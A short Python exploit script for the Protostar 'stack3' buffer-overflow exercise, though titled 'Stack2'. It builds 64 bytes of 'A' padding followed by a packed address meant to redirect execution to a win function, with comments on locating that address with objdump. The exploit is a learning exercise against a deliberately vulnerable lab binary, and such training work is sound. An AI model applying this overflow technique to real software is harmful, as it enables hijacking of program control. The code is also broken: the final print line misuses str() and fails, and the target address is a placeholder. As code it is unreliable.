# Stack2 Protostar

# objdump -t ./stack3 | grep win
# win would be the address
# place the address of the target under 0x00000000

import struct

padding = "\x41" * 64
payload = struct.pack("I", 0x00000000)

print(str(padding, payload))
